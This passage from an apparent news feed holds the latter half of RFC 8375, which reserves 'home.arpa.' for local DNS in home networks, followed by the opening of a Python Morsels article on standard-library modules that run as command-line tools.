   Although this document makes specific reference to [<a href="https://datatracker.ietf.org/doc/html/rfc7788" title="&quot;Home Networking Control Protocol&quot;">RFC7788</a>], it is
   not intended that the use of 'home.arpa.' be restricted solely to
   networks where HNCP is deployed.  Rather, 'home.arpa.' is intended to
   be the correct domain for uses like the one described for '.home' in
   [<a href="https://datatracker.ietf.org/doc/html/rfc7788" title="&quot;Home Networking Control Protocol&quot;">RFC7788</a>]: local name service in residential homenets.








<span>Pfister &amp; Lemon              Standards Track                    [Page 3]</span></pre>
<hr><!--NewPage--><pre><span id="page-4"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc8375">RFC 8375</a>                       home.arpa.                       May 2018</span>


<span><a id="section-2" href="#section-2">2</a>.  Requirements Language</span>

   The key words "MUST", "MUST NOT", "REQUIRED", "SHALL", "SHALL NOT",
   "SHOULD", "SHOULD NOT", "RECOMMENDED", "NOT RECOMMENDED", "MAY", and
   "OPTIONAL" in this document are to be interpreted as described in
   <a href="https://datatracker.ietf.org/doc/html/bcp14">BCP 14</a> [<a href="https://datatracker.ietf.org/doc/html/rfc2119" title="&quot;Key words for use in RFCs to Indicate Requirement Levels&quot;">RFC2119</a>] [<a href="https://datatracker.ietf.org/doc/html/rfc8174" title="&quot;Ambiguity of Uppercase vs Lowercase in RFC 2119 Key Words&quot;">RFC8174</a>] when, and only when, they appear in all
   capitals, as shown here.

<span><a id="section-3" href="#section-3">3</a>.  General Guidance</span>

   The domain name 'home.arpa.' is to be used for naming within
   residential homenets.  Names ending with '.home.arpa.' reference a
   zone that is served locally, the contents of which are unique only to
   a particular homenet and are not globally unique.  Such names refer
   to nodes and/or services that are located within a homenet (e.g., a
   printer or a toaster).

   DNS queries for names ending with '.home.arpa.' are resolved using
   local resolvers on the homenet.  Such queries MUST NOT be recursively
   forwarded to servers outside the logical boundaries of the homenet.

   Some service discovery user interfaces that are expected to be used
   on homenets conceal information such as domain names from end users.
   However, in some cases, it is still expected that users will need to
   see, remember, and even type names ending with '.home.arpa.'.  The
   Homenet Working Group hopes that this name will in some way indicate
   to as many readers as possible that such domain names are referring
   to devices in the home, but we recognize that it is an imperfect
   solution.

<span><a id="section-4" href="#section-4">4</a>.  Domain Name Reservation Considerations</span>

   This section specifies considerations for systems involved in domain
   name resolution when resolving queries for names ending with
   '.home.arpa.'.  Each item in this section addresses some aspect of
   the DNS or the process of resolving domain names that would be
   affected by this special-use allocation.  Detailed explanations of
   these items can be found in <a href="https://datatracker.ietf.org/doc/html/rfc6761#section-5">Section&nbsp;5 of [RFC6761]</a>.  Although the
   term 'homenet' in [<a href="https://datatracker.ietf.org/doc/html/rfc7788" title="&quot;Home Networking Control Protocol&quot;">RFC7788</a>] refers to home networks that implement a
   particular set of features, in this document the term is used to mean
   any home network, regardless of the set of features it implements.

   1.  Users can use names ending with '.home.arpa.' just as they would
       use any other domain name.  The 'home.arpa.' name is chosen to be
       readily recognized by users as signifying that the name is
       addressing a service on the homenet to which the user's device is
       connected.




<span>Pfister &amp; Lemon              Standards Track                    [Page 4]</span></pre>
<hr><!--NewPage--><pre><span id="page-5"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc8375">RFC 8375</a>                       home.arpa.                       May 2018</span>


   2.  Application software SHOULD NOT treat names ending in
       '.home.arpa.' differently than other names.  In particular, there
       is no basis for trusting names that are subdomains of
       'home.arpa.' (see <a href="#section-6">Section 6</a>).

   3.  Name resolution APIs and libraries MUST NOT recognize names that
       end in '.home.arpa.' as special and MUST NOT treat them as having
       special significance, except that it may be necessary that such
       APIs not bypass the locally configured recursive resolvers.

       One or more IP addresses for recursive DNS servers will usually
       be supplied to the client through router advertisements or DHCP.
       For an administrative domain that uses subdomains of
       'home.arpa.', such as a homenet, the recursive resolvers provided
       by that domain will be able to answer queries for subdomains of
       'home.arpa.'; other resolvers will not, or they will provide
       answers that are not correct within that administrative domain.

       A host that is configured to use a resolver other than one that
       has been provided by the local network may be unable to resolve,
       or may receive incorrect results for, subdomains of 'home.arpa.'.
       In order to avoid this, it is permissible that hosts use the
       resolvers that are locally provided for resolving 'home.arpa.',
       even when they are configured to use other resolvers.

   4.  There are three considerations for recursive resolvers that
       follow this specification:

       A.  Recursive resolvers at sites using 'home.arpa.'  MUST
           transparently support DNSSEC queries: queries for DNSSEC
           records and queries with the DNSSEC OK (DO) bit set (see
           <a href="https://datatracker.ietf.org/doc/html/rfc4035#section-3.2.1">Section&nbsp;3.2.1 of [RFC4035]</a>).  While validation is not
           required, it is strongly encouraged: a caching recursive
           resolver that does not validate answers that can be validated
           may cache invalid data.  This, in turn, will prevent
           validating stub resolvers from successfully validating
           answers.

       B.  Unless configured otherwise, recursive resolvers and DNS
           proxies MUST behave as described in <a href="#section-3">Section 3</a> of the Locally
           Served Zones document [<a href="https://datatracker.ietf.org/doc/html/rfc6303" title="&quot;Locally Served DNS Zones&quot;">RFC6303</a>].  That is, queries for
           'home.arpa.' and subdomains of 'home.arpa.'  MUST NOT be
           forwarded, with one important exception: a query for a DS
           record with the DO bit set MUST return the correct answer for
           that question, including correct information in the authority
           section that proves that the record is nonexistent.





<span>Pfister &amp; Lemon              Standards Track                    [Page 5]</span></pre>
<hr><!--NewPage--><pre><span id="page-6"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc8375">RFC 8375</a>                       home.arpa.                       May 2018</span>


           So, for example, a query for the NS record for 'home.arpa.'
           MUST NOT result in that query being forwarded to an upstream
           cache nor to the authoritative DNS server for '.arpa.'.
           However, as necessary to provide accurate authority
           information, a query for the DS record MUST result in
           forwarding whatever queries are necessary; typically, this
           will just be a query for the DS record, since the necessary
           authority information will be included in the authority
           section of the response if the DO bit is set.

       C.  In addition to the behavior specified above, recursive
           resolvers that can be used in a homenet MUST be configurable
           to forward queries for 'home.arpa.' and subdomains of
           'home.arpa.' to an authoritative server for 'home.arpa.'.
           This server will provide authoritative data for 'home.arpa.'
           within a particular homenet.  The special handling for DS
           records for the 'home.arpa.' delegation is still required.

           It is permissible to combine the recursive resolver function
           for general DNS lookups with an authoritative resolver for
           'home.arpa.'; in this case, rather than forwarding queries
           for subdomains of 'home.arpa.' to an authoritative server,
           the resolver answers them authoritatively.  The behavior with
           respect to forwarding queries specifically for 'home.arpa.'
           remains the same.

   5.  No special processing of 'home.arpa.' is required for
       authoritative DNS server implementations.  It is possible that an
       authoritative DNS server might attempt to check the authoritative
       servers for 'home.arpa.' for a delegation beneath that name
       before answering authoritatively for such a delegated name.  In
       such a case, because the name always has only local significance,
       there will be no such delegation in the 'home.arpa.' zone, and so
       the server would refuse to answer authoritatively for such a
       zone.  A server that implements this sort of check MUST be
       configurable so that either it does not do this check for the
       'home.arpa.' domain or it ignores the results of the check.

   6.  DNS server operators MAY configure an authoritative server for
       'home.arpa.' for use in homenets and other home networks.  The
       operator for the DNS servers authoritative for 'home.arpa.' in
       the global DNS will configure any such servers as described in
       <a href="#section-7">Section 7</a>.

   7.  'home.arpa.' is a subdomain of the 'arpa' top-level domain, which
       is operated by IANA under the authority of the Internet
       Architecture Board according to the rules established in
       [<a href="https://datatracker.ietf.org/doc/html/rfc3172" title="&quot;Management Guidelines &amp; Operational Requirements for the Address and Routing Parameter Area Domain (&quot;">RFC3172</a>].  There are no other registrars for '.arpa'.



<span>Pfister &amp; Lemon              Standards Track                    [Page 6]</span></pre>
<hr><!--NewPage--><pre><span id="page-7"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc8375">RFC 8375</a>                       home.arpa.                       May 2018</span>


<span><a id="section-5" href="#section-5">5</a>.  Updates to Home Networking Control Protocol</span>

   The final paragraph in <a href="https://datatracker.ietf.org/doc/html/rfc7788#section-8">Section&nbsp;8 of [RFC7788]</a>, the Home Networking
   Control Protocol, is updated as follows:

   OLD:
      Names and unqualified zones are used in an HNCP network to provide
      naming and service discovery with local significance.  A network-
      wide zone is appended to all single labels or unqualified zones in
      order to qualify them. ".home" is the default; however, an
      administrator MAY configure the announcement of a Domain-Name TLV
      (<a href="#section-10.6">Section 10.6</a>) for the network to use a different one.  In case
      multiple are announced, the domain of the node with the greatest
      node identifier takes precedence.

   NEW:
      Names and unqualified zones are used in an HNCP network to provide
      naming and service discovery with local significance.  A network-
      wide zone is appended to all single labels or unqualified zones in
      order to qualify them. 'home.arpa.' is the default; however, an
      administrator MAY configure the announcement of a Domain-Name TLV
      (<a href="#section-10.6">Section 10.6</a>) for the network to use a different one.  In case
      multiple TLVs are announced, the domain of the node with the
      greatest node identifier takes precedence.

      The 'home.arpa.' special-use name does not require a special
      resolution protocol.  Names for which the rightmost two labels are
      'home.arpa.' are resolved using the DNS protocol [<a href="https://datatracker.ietf.org/doc/html/rfc1035" title="&quot;Domain names - implementation and specification&quot;">RFC1035</a>].

<span><a id="section-6" href="#section-6">6</a>.  Security Considerations</span>

<span><a id="section-6.1" href="#section-6.1">6.1</a>.  Local Significance</span>

   A DNS record that is returned as a response to a query for a Fully
   Qualified Domain Name (FQDN) that is a subdomain of 'home.arpa.' is
   expected to have local significance.  It is expected to be returned
   by a server involved in name resolution for the homenet the device is
   connected in.  However, such a response MUST NOT be considered more
   trustworthy than a similar response for any other DNS query.

   Because 'home.arpa.' is not globally scoped and cannot be secured
   using DNSSEC based on the root domain's trust anchor, there is no way
   to tell, using a standard DNS query, in which homenet scope an answer
   belongs.  Consequently, users may experience surprising results with
   such names when roaming to different homenets.






<span>Pfister &amp; Lemon              Standards Track                    [Page 7]</span></pre>
<hr><!--NewPage--><pre><span id="page-8"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc8375">RFC 8375</a>                       home.arpa.                       May 2018</span>


   To prevent this from happening, it could be useful for the resolver
   on the host to securely differentiate between different homenets and
   between identical names on different homenets.  However, a mechanism
   for doing this has not yet been standardized and doing so is out of
   scope for this document.  It is expected that this will be explored
   in future work.

   The advice in <a href="https://datatracker.ietf.org/doc/html/rfc6303#section-7">[RFC6303], Section&nbsp;7</a>, to install local trust anchors
   for locally served zones can only work if there is some way of
   configuring the trust anchor in the host.  Homenet currently
   specifies no mechanism for configuring such trust anchors.  As a
   result, while this advice sounds good, it is not practicable.

   Also, although it might be useful to install a trust anchor for a
   particular instance of 'home.arpa.', it's reasonable to expect that a
   host with such a trust anchor might, from time to time, connect to
   more than one network with its own instance of 'home.arpa.'.  Such a
   host would be unable to access services on any instance of
   'home.arpa.' other than the one for which a trust anchor was
   configured.

   It is, in principle, possible to attach an identifier to an instance
   of 'home.arpa.' that could be used to identify which trust anchor to
   rely on for validating names in that particular instance.  However,
   the security implications of this are complicated, and such a
   mechanism, as well as a discussion of those implications, is out of
   scope for this document.

<span><a id="section-6.2" href="#section-6.2">6.2</a>.  Insecure Delegation</span>

   It is not possible to install a trust anchor (a DS RR) for this zone
   in the '.arpa' zone.  The reason for this is that in order to do so,
   it would be necessary to have the key-signing key for the zone (see
   <a href="https://datatracker.ietf.org/doc/html/rfc4034#section-5">Section&nbsp;5 of [RFC4034]</a>).  Since the zone is not globally unique, no
   one key would work.

   An alternative would be to provide an authenticated denial of
   existence (see <a href="https://datatracker.ietf.org/doc/html/rfc4033#section-3.2">Section&nbsp;3.2 of [RFC4033]</a>).  This would be done simply
   by not having a delegation from the 'arpa.' zone.  However, this
   requires the validating resolver to treat 'home.arpa.' specially.  If
   a validating resolver that doesn't treat 'home.arpa.' specially
   attempts to validate a name in 'home.arpa.', an authenticated denial
   of existence of 'home' as a subdomain of 'arpa.' would cause the
   validation to fail.  Therefore, the only delegation that will allow
   names under 'home.arpa.' to be resolved by all validating resolvers
   is an insecure delegation, as in <a href="https://datatracker.ietf.org/doc/html/rfc6303#section-7">Section&nbsp;7 of [RFC6303]</a>.





<span>Pfister &amp; Lemon              Standards Track                    [Page 8]</span></pre>
<hr><!--NewPage--><pre><span id="page-9"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc8375">RFC 8375</a>                       home.arpa.                       May 2018</span>


   Consequently, unless a trust anchor for the particular instance of
   the 'home.arpa.' zone being validated is manually configured on the
   validating resolver, DNSSEC signing and validation of names within
   the 'home.arpa.' zone is not possible.

<span><a id="section-6.3" href="#section-6.3">6.3</a>.  Bypassing Manually Configured Resolvers</span>

   In item 3 of <a href="#section-4">Section 4</a>, an exception is made to the behavior of stub
   resolvers that allows them to query local resolvers for subdomains of
   'home.arpa.' even when they have been manually configured to use
   other resolvers.  This behavior obviously has security and privacy
   implications and may not be desirable depending on the context.  It
   may be better to simply ignore this exception and, when one or more
   recursive resolvers are configured manually, simply fail to provide
   correct answers for subdomains of 'home.arpa.'.  At this time, we do
   not have operational experience that would guide us in making this
   decision; implementors are encouraged to consider the context in
   which their software will be deployed when deciding how to resolve
   this question.

<span><a id="section-7" href="#section-7">7</a>.  Delegation of 'home.arpa.'</span>

   In order to be fully functional, there must be a delegation of
   'home.arpa.' in the '.arpa.' zone [<a href="https://datatracker.ietf.org/doc/html/rfc3172" title="&quot;Management Guidelines &amp; Operational Requirements for the Address and Routing Parameter Area Domain (&quot;">RFC3172</a>].  This delegation MUST
   NOT include a DS record and MUST point to one or more black hole
   servers, for example, 'blackhole-1.iana.org.' and 'blackhole-
   2.iana.org.'.  The reason that this delegation must not be signed is
   that not signing the delegation breaks the DNSSEC chain of trust,
   which prevents a validating stub resolver from rejecting names
   published under 'home.arpa.' on a homenet name server.

<span><a id="section-8" href="#section-8">8</a>.  IANA Considerations</span>

   IANA has recorded the domain name 'home.arpa.' in the "Special-Use
   Domain Names" registry [<a href="#ref-SUDN" title="&quot;Special-Use Domain Names&quot;">SUDN</a>].  IANA, with the approval of the IAB,
   has implemented the delegation requested in <a href="#section-7">Section 7</a>.

   IANA has created a new subregistry within the "Locally-Served DNS
   Zones" registry [<a href="#ref-LSDZ" title="&quot;Locally-Served DNS Zones&quot;">LSDZ</a>], titled "Transport-Independent Locally-Served
   DNS Zone Registry", with the same format as the other subregistries.
   IANA has added an entry in this new registry for 'home.arpa.' with
   the description "Homenet Special-Use Domain", listing this document
   as the reference.  The registration procedure for this subregistry
   should be the same as for the others, currently "IETF Review" (see
   <a href="https://datatracker.ietf.org/doc/html/rfc8126#section-4.8">Section&nbsp;4.8 of [RFC8126]</a>).






<span>Pfister &amp; Lemon              Standards Track                    [Page 9]</span></pre>
<hr><!--NewPage--><pre><span id="page-10"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc8375">RFC 8375</a>                       home.arpa.                       May 2018</span>


<span><a id="section-9" href="#section-9">9</a>.  References</span>

<span><a id="section-9.1" href="#section-9.1">9.1</a>.  Normative References</span>

   [<a id="ref-RFC2119">RFC2119</a>]  Bradner, S., "Key words for use in RFCs to Indicate
              Requirement Levels", <a href="https://datatracker.ietf.org/doc/html/bcp14">BCP 14</a>, <a href="https://datatracker.ietf.org/doc/html/rfc2119">RFC 2119</a>,
              DOI 10.17487/RFC2119, March 1997,
              &lt;<a href="https://www.rfc-editor.org/info/rfc2119">https://www.rfc-editor.org/info/rfc2119</a>&gt;.

   [<a id="ref-RFC3172">RFC3172</a>]  Huston, G., Ed., "Management Guidelines &amp; Operational
              Requirements for the Address and Routing Parameter Area
              Domain ("arpa")", <a href="https://datatracker.ietf.org/doc/html/bcp52">BCP 52</a>, <a href="https://datatracker.ietf.org/doc/html/rfc3172">RFC 3172</a>, DOI 10.17487/RFC3172,
              September 2001, &lt;<a href="https://www.rfc-editor.org/info/rfc3172">https://www.rfc-editor.org/info/rfc3172</a>&gt;.

   [<a id="ref-RFC4035">RFC4035</a>]  Arends, R., Austein, R., Larson, M., Massey, D., and S.
              Rose, "Protocol Modifications for the DNS Security
              Extensions", <a href="https://datatracker.ietf.org/doc/html/rfc4035">RFC 4035</a>, DOI 10.17487/RFC4035, March 2005,
              &lt;<a href="https://www.rfc-editor.org/info/rfc4035">https://www.rfc-editor.org/info/rfc4035</a>&gt;.

   [<a id="ref-RFC6303">RFC6303</a>]  Andrews, M., "Locally Served DNS Zones", <a href="https://datatracker.ietf.org/doc/html/bcp163">BCP 163</a>,
              <a href="https://datatracker.ietf.org/doc/html/rfc6303">RFC 6303</a>, DOI 10.17487/RFC6303, July 2011,
              &lt;<a href="https://www.rfc-editor.org/info/rfc6303">https://www.rfc-editor.org/info/rfc6303</a>&gt;.

   [<a id="ref-RFC6761">RFC6761</a>]  Cheshire, S. and M. Krochmal, "Special-Use Domain Names",
              <a href="https://datatracker.ietf.org/doc/html/rfc6761">RFC 6761</a>, DOI 10.17487/RFC6761, February 2013,
              &lt;<a href="https://www.rfc-editor.org/info/rfc6761">https://www.rfc-editor.org/info/rfc6761</a>&gt;.

   [<a id="ref-RFC8174">RFC8174</a>]  Leiba, B., "Ambiguity of Uppercase vs Lowercase in <a href="https://datatracker.ietf.org/doc/html/rfc2119">RFC</a>
              <a href="https://datatracker.ietf.org/doc/html/rfc2119">2119</a> Key Words", <a href="https://datatracker.ietf.org/doc/html/bcp14">BCP 14</a>, <a href="https://datatracker.ietf.org/doc/html/rfc8174">RFC 8174</a>, DOI 10.17487/RFC8174,
              May 2017, &lt;<a href="https://www.rfc-editor.org/info/rfc8174">https://www.rfc-editor.org/info/rfc8174</a>&gt;.

<span><a id="section-9.2" href="#section-9.2">9.2</a>.  Informative References</span>

   [<a id="ref-ICANN1">ICANN1</a>]   "New gTLD Collision Risk Mitigation", August 2013,
              &lt;<a href="https://www.icann.org/en/system/files/files/new-gtld-collision-mitigation-05aug13-en.pdf">https://www.icann.org/en/system/files/files/</a>
              <a href="https://www.icann.org/en/system/files/files/new-gtld-collision-mitigation-05aug13-en.pdf">new-gtld-collision-mitigation-05aug13-en.pdf</a>&gt;.

   [<a id="ref-ICANN2">ICANN2</a>]   "New gTLD Collision Occurence Management", October 2013,
              &lt;<a href="https://www.icann.org/en/system/files/files/resolutions-new-gtld-annex-1-07oct13-en.pdf">https://www.icann.org/en/system/files/files/</a>
              <a href="https://www.icann.org/en/system/files/files/resolutions-new-gtld-annex-1-07oct13-en.pdf">resolutions-new-gtld-annex-1-07oct13-en.pdf</a>&gt;.

   [<a id="ref-LSDZ">LSDZ</a>]     "Locally-Served DNS Zones", July 2011,
              &lt;<a href="https://www.iana.org/assignments/locally-served-dns-zones/">https://www.iana.org/assignments/</a>
              <a href="https://www.iana.org/assignments/locally-served-dns-zones/">locally-served-dns-zones/</a>&gt;.

   [<a id="ref-RFC1035">RFC1035</a>]  Mockapetris, P., "Domain names - implementation and
              specification", STD 13, <a href="https://datatracker.ietf.org/doc/html/rfc1035">RFC 1035</a>, DOI 10.17487/RFC1035,
              November 1987, &lt;<a href="https://www.rfc-editor.org/info/rfc1035">https://www.rfc-editor.org/info/rfc1035</a>&gt;.



<span>Pfister &amp; Lemon              Standards Track                   [Page 10]</span></pre>
<hr><!--NewPage--><pre><span id="page-11"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc8375">RFC 8375</a>                       home.arpa.                       May 2018</span>


   [<a id="ref-RFC4033">RFC4033</a>]  Arends, R., Austein, R., Larson, M., Massey, D., and S.
              Rose, "DNS Security Introduction and Requirements",
              <a href="https://datatracker.ietf.org/doc/html/rfc4033">RFC 4033</a>, DOI 10.17487/RFC4033, March 2005,
              &lt;<a href="https://www.rfc-editor.org/info/rfc4033">https://www.rfc-editor.org/info/rfc4033</a>&gt;.

   [<a id="ref-RFC4034">RFC4034</a>]  Arends, R., Austein, R., Larson, M., Massey, D., and S.
              Rose, "Resource Records for the DNS Security Extensions",
              <a href="https://datatracker.ietf.org/doc/html/rfc4034">RFC 4034</a>, DOI 10.17487/RFC4034, March 2005,
              &lt;<a href="https://www.rfc-editor.org/info/rfc4034">https://www.rfc-editor.org/info/rfc4034</a>&gt;.

   [<a id="ref-RFC7368">RFC7368</a>]  Chown, T., Ed., Arkko, J., Brandt, A., Troan, O., and J.
              Weil, "IPv6 Home Networking Architecture Principles",
              <a href="https://datatracker.ietf.org/doc/html/rfc7368">RFC 7368</a>, DOI 10.17487/RFC7368, October 2014,
              &lt;<a href="https://www.rfc-editor.org/info/rfc7368">https://www.rfc-editor.org/info/rfc7368</a>&gt;.

   [<a id="ref-RFC7788">RFC7788</a>]  Stenberg, M., Barth, S., and P. Pfister, "Home Networking
              Control Protocol", <a href="https://datatracker.ietf.org/doc/html/rfc7788">RFC 7788</a>, DOI 10.17487/RFC7788, April
              2016, &lt;<a href="https://www.rfc-editor.org/info/rfc7788">https://www.rfc-editor.org/info/rfc7788</a>&gt;.

   [<a id="ref-RFC8126">RFC8126</a>]  Cotton, M., Leiba, B., and T. Narten, "Guidelines for
              Writing an IANA Considerations Section in RFCs", <a href="https://datatracker.ietf.org/doc/html/bcp26">BCP 26</a>,
              <a href="https://datatracker.ietf.org/doc/html/rfc8126">RFC 8126</a>, DOI 10.17487/RFC8126, June 2017,
              &lt;<a href="https://www.rfc-editor.org/info/rfc8126">https://www.rfc-editor.org/info/rfc8126</a>&gt;.

   [<a id="ref-SUDN">SUDN</a>]     "Special-Use Domain Names", July 2012,
              &lt;<a href="https://www.iana.org/assignments/special-use-domain-names/">https://www.iana.org/assignments/</a>
              <a href="https://www.iana.org/assignments/special-use-domain-names/">special-use-domain-names/</a>&gt;.
























<span>Pfister &amp; Lemon              Standards Track                   [Page 11]</span></pre>
<hr><!--NewPage--><pre><span id="page-12"></span>
<span><a href="https://datatracker.ietf.org/doc/html/rfc8375">RFC 8375</a>                       home.arpa.                       May 2018</span>


Acknowledgments

   The authors would like to thank Stuart Cheshire, as well as the
   homenet chairs, Mark Townsley and Ray Bellis, for their prior work on
   '.home'.  We would also like to thank Paul Hoffman for providing
   review and comments on the IANA Considerations section, Andrew
   Sullivan for his review and proposed text, and Suzanne Woolf and Ray
   Bellis for their very detailed review comments and process insights.
   Thanks to Mark Andrews for providing an exhaustive reference list on
   the topic of insecure delegations.  Thanks to Dale Worley for
   catching a rather egregious mistake and for the Gen-Art review, and
   thanks to Daniel Migault for a thorough SecDir review.  Thanks to
   Warren Kumari for catching some additional issues and to Adam Roach
   for some helpful clarifications.

Authors' Addresses

   Pierre Pfister
   Cisco Systems
   Paris
   France

   Email: pierre.pfister@darou.fr


   Ted Lemon
   Nibbhaya Consulting
   P.O. Box 958
   Brattleboro, Vermont  05301-0958
   United States of America

   Email: mellon@fugue.com



















Pfister &amp; Lemon              Standards Track                   [Page 12]
</pre></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Python's many command-line utilities (113 pts)]]></title>
            <link>https://www.pythonmorsels.com/cli-tools/</link>
            <guid>40567532</guid>
            <pubDate>Mon, 03 Jun 2024 21:03:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.pythonmorsels.com/cli-tools/">https://www.pythonmorsels.com/cli-tools/</a>, See on <a href="https://news.ycombinator.com/item?id=40567532">Hacker News</a></p>
<div id="readability-page-1" class="page"><div x-data="topic" x-init="trackVisibilityTime()">
<p>Did you know that some Python modules can double-up as handy command-line tools?</p>
<p>For example, you can run Python's <code>webbrowser</code> module from the command-line to open up a given URL in your default web browser:</p>
<div><pre><span></span><code>$ python -m webbrowser https://pym.dev/p
Opening <span>in</span> existing browser session.
</code></pre></div>
<p>The Python standard library includes many such <strong>module-script hybrids</strong>.</p>
<p>Below is a complete list of <strong>every module in Python that can be run as a command-line script</strong>.</p>
<p>Feel free to jump right to <a href="#cheat-sheet" target="_blank">the full list of all scripts in Python</a> at the end.</p>
<h2 id="how-m-works">How <code>-m</code> works</h2>
<p>Running Python with the <code>-m</code> command-line argument tells Python to run a given Python module as if it were a <a href="https://www.pythonmorsels.com/module-vs-script/" target="_blank">Python script</a>.</p>
<p>Some modules <em>do</em> something at import time.
For example <a href="https://github.com/python/cpython/blob/main/Lib/antigravity.py" target="_blank">the <code>antigravity</code> module</a> will open up a web browser for an XKCD comic.
Running this module from the command-line would do the same thing as importing it:</p>

<p>This is called an "import side effect" and most modules avoid import side effects.
Fun Easter egg modules like <code>antigravity</code> and <code>this</code> are the exception.</p>
<p>Modules that avoid import side effects need a different mechanism to change their behavior when run as a command-line script or when imported as a module.
Python uses a <code>__name__</code> variable to distinguish between importing a module and running a module as a script.</p>
<p>When Python runs a module as a script, it sets the module's name to the string <code>"__main__"</code> (normally <code>__name__</code> would contain the module's <em>actual</em> name).
See more in <a href="https://www.pythonmorsels.com/making-main-function-python/" target="_blank">defining a main function in Python</a>.</p>
<p>For packages, Python also looks for a <code>__main__.py</code> file to run (there's one in <a href="https://github.com/python/cpython/blob/main/Lib/zipfile/__main__.py" target="_blank">the <code>zipfile</code> package</a> for example).</p>
<p>This distinction between module versus script allows for some really nifty command-line tools.</p>

<p>The first tools we'll look at are tools that I use even when I'm <em>not</em> working with Python code.</p>
<p>These are Python's most helpful general-purpose command-line tools.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Purpose</th>
<th>More</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python -m http.server</code></td>
<td>Start a simple web server</td>
<td><a href="https://www.pythonmorsels.com/http-server/" target="_blank">Video</a></td>
</tr>
<tr>
<td><code>python -m webbrowser</code></td>
<td>Launch your web browser</td>
<td><a href="https://docs.python.org/3/library/webbrowser.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m json.tool</code></td>
<td>Nicely format JSON data</td>
<td><a href="https://docs.python.org/3/library/json.html#module-json.tool" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m calendar</code></td>
<td>Show a command-line calendar</td>
<td><a href="https://docs.python.org/3/library/calendar.html#command-line-usage" target="_blank">Docs</a></td>
</tr>
</tbody>
</table>
<h3 id="httpserver"><code>http.server</code></h3>
<p>Running the <code>http.server</code> module as a script will start a web server on port 8000 that hosts files from the current directory.
I use this <em>all the time</em> to preview Sphinx documentation sites (especially when using Sphinx's <code>dirhtml</code> option which is <em>all about</em> subdirectories of <code>index.html</code> files).</p>
<div><pre><span></span><code>$ python -m http.server
Serving HTTP on <span>0</span>.0.0.0 port <span>8000</span> <span>(</span>http://0.0.0.0:8000/<span>)</span> ...
</code></pre></div>
<h3 id="webbrowser"><code>webbrowser</code></h3>
<p>Running the <code>webbrowser</code> module as a script will open a given URL in your default web browser.
For example, this would open the page https://pseudorandom.name:</p>
<div><pre><span></span><code>$ python -m webbrowser pseudorandom.name
</code></pre></div>
<h3 id="jsontool"><code>json.tool</code></h3>
<p>Python's <code>json.tool</code> module can be run as a script to parse a JSON document and print out a version that's formatted nicely for human readability.</p>
<div><pre><span></span><code>$ python -m json.tool /home/trey/Downloads/download.json
<span>[</span>
    <span>{</span>
        <span>"title"</span>: <span>"Python's walrus operator"</span>,
        <span>"is_premium"</span>: false,
        <span>"url"</span>: <span>"/using-walrus-operator/"</span>
    <span>}</span>,
    <span>{</span>
        <span>"title"</span>: <span>"Refactoring long boolean expressions"</span>,
        <span>"is_premium"</span>: true,
        <span>"url"</span>: <span>"/refactoring-boolean-expressions/"</span>
    <span>}</span>
<span>]</span>
</code></pre></div>
<h3 id="calendar"><code>calendar</code></h3>
<p>Running the <code>calendar</code> module as a script will print a calendar of the current year by default.
It also accepts various arguments to customize its output.
Here's a calendar of just one month:</p>
<div><pre><span></span><code>$ python -m calendar <span>2024</span> <span>04</span>
     April <span>2024</span>
Mo Tu We Th Fr Sa Su
 <span>1</span>  <span>2</span>  <span>3</span>  <span>4</span>  <span>5</span>  <span>6</span>  <span>7</span>
 <span>8</span>  <span>9</span> <span>10</span> <span>11</span> <span>12</span> <span>13</span> <span>14</span>
<span>15</span> <span>16</span> <span>17</span> <span>18</span> <span>19</span> <span>20</span> <span>21</span>
<span>22</span> <span>23</span> <span>24</span> <span>25</span> <span>26</span> <span>27</span> <span>28</span>
<span>29</span> <span>30</span>
</code></pre></div>
<p>Those 4 scripts are general-purpose tools that I find helpful on <em>any</em> machine.
Python also includes a number of tools that are commonly available (or easily installable) on Linux and Mac machines.</p>
<h2 id="windows">Especially handy on Windows machines</h2>
<p>Running Python on Windows?
Or running Python on a Linux/Mac machine without the ability to easily install common command-line utilities like <code>uuid</code>, <code>sqlite3</code> and <code>gzip</code>?</p>
<p>These tools are all equivalent to command-line tools that are common on many Linux machines, though the equivalent Linux commands are usually more powerful and more user-friendly.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Purpose</th>
<th>More</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python3.12 -m uuid</code></td>
<td>Like <code>uuidgen</code> CLI utility</td>
<td><a href="https://docs.python.org/3/library/uuid.html#command-line-usage" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python3.12 -m sqlite3</code></td>
<td>Like <code>sqlite3</code> CLI utility</td>
<td><a href="https://docs.python.org/3/library/sqlite3.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m zipfile</code></td>
<td>Like <code>zip</code> &amp; <code>unzip</code> CLI utilities</td>
<td><a href="https://docs.python.org/3/library/zipfile.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m gzip</code></td>
<td>Like <code>gzip</code> &amp; <code>gunzip</code> CLI utilities</td>
<td><a href="https://docs.python.org/3/library/gzip.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m tarfile</code></td>
<td>Like the <code>tar</code> CLI utility</td>
<td><a href="https://docs.python.org/3/library/tarfile.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m base64</code></td>
<td>Like the <code>base64</code> CLI utility</td>
<td></td>
</tr>
<tr>
<td><code>python -m ftplib</code></td>
<td>Like the <code>ftp</code> utility</td>
<td></td>
</tr>
<tr>
<td><code>python -m smtplib</code></td>
<td>Like the <code>sendmail</code> utility</td>
<td></td>
</tr>
<tr>
<td><code>python -m poplib</code></td>
<td>Like using <code>curl</code> to read email</td>
<td></td>
